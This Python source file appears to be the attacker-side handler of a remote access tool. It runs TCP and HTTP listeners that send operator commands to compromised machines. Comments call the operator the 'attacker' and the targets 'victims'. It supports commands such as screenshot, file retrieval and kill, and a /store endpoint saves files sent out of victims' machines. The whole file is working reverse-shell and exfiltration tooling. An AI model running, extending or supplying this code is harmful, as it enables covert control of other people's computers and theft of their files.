import socket
import http.server
from time import sleep
from termcolor import colored
from .autocompleter import CommandCompleter
from .tool_data import shell_help
import getpass
import cgi
import os  


DOWNLOAD_PATH = f"home/{getpass.getuser()}/Desktop"

class TCPShell:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.connect(self.host, self.port)
    def connect(self, host: str, port: int) -> None:
        try:
            socket_obj = socket.socket()
            socket_obj.bind((host, port))
            socket_obj.listen(1)
            print(colored(f"[+] Waiting for a TCP connection on [{host}, {port}]", "yellow"))
            conn, address = socket_obj.accept()
            print ('[+] We got a connection from: ', colored(address, "yellow"))
            while True:
                command = input("TCP-Shell> ")
                if 'terminate' in command:
                    conn.send('terminate'.encode())
                    conn.close()
                    break
                else:
                    conn.send(command.encode())
                    print("\n", colored(conn.recv(1024 * 5).decode(), "green"))
        except:
            sleep(5)


class HTTPServerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input("HTTP-Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print("\n", colored(postVar.decode(), "green"))



class FatehHTTPShell:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.av_commands = ["cd", "get_file", "download_file", "find_file",
                      "kill", "auto_run",
                      "terminate", "screenshot","system_info",
                      "_help", "_termenate"]
        self.completer = CommandCompleter(self.av_commands)

    def do_GET(self):
        # Reading commands from attacker
        command = self.completer.read_input("Shell")
        if command.split(" ")[0] == "_help":
            shell_help("Shell")
        elif "_terminate" in command:
            return
        else:   # sending the command to the target machine.
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            #TODO: must do encryption here :)
            self.wfile.write(command.encode())


    def do_POST(self):
        # for sending files
        if self.path == '/store':
            content_type, _ = cgi.parse_header(self.headers.get('content-type'))
            if content_type == 'multipart/form-data':
                files = cgi.FieldStorage(fp = self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                print(files)
            else:
                print(colored('[-] Unexpected POST request', 'red'))
                # Getting files from victims machins into yours.
            client_file = files['file']
            file_content = client_file.file.read()
            incoming_file_name = input(colored("\n[+] Save file as >> ", "red"))

            dfp = os.path.join(DOWNLOAD_PATH, incoming_file_name) # Download file path
            with open(dfp, 'wb') as file_object:
                print(colored(f'[+] Writing {colored(incoming_file_name, "yellow")} file ..', 'green'))
                file_object.write(file_content)
            self.send_response(200)
            self.end_headers()
            # check if the file was downloaded successfully
            if os.path.isfile(dfp):
                print(colored("[+]", "green"), "File was downloaded successfully\n")
            else:
                print(colored("[-]", "red"), f"An error was occurred while downloading the {incoming_file_name}\n")
            return

        self.send_response(200)
        self.end_headers()
        # it return string by default so we will casting/converting it to integer
        length = int(self.headers['Content-length'])
        post_value = self.rfile.read(length)
        # must do decryption here
        # displaying command outputs.
        print(colored(post_value.decode(), "green"))


class HTTPShell:
    def __init__(self, http_server, host: str, port: int):
        self.host = host
        self.port = port
        self.http_server = http_server
        server_class = http.server.HTTPServer
        # you can read more: https://docs.python.org/3/library/http.server.html
        httpd = server_class((self.host, self.port), self.http_server)
        os.system("clear")
        print(colored(f"[+] Starting HTTP server @ {host}:{port}", "green"))
        print(colored("[?] Ctrl+C to terminate the server", "yellow"))
        print(colored("[+] Wating for incomming HTTP connections. . .", "yellow"))
        httpd.serve_forever()
        os.system("clear")


class Handler:
    def __init__(self, handler_type: str = "tcp", host: str = "127.0.0.1", port: int = 8080):
        self.handler_type = handler_type
        self.host = host
        self.port = port
        self.handler_type = handler_type
        if self.handler_type.lower()== "tcp":
            # calling tcp handler
            TCPShell(self.host, self.port)
        elif self.handler_type.lower() == "http":
            # calling http hanldler
            HTTPShell(HTTPServerHandler, self.host, self.port)
        elif self.handler_type.lower() == "fateh":
            HTTPShell(FatehHTTPShell, self.host, self.port)

if __name__ == "__main__":
    Handler("tcp", "127.0.0.1", 8080)
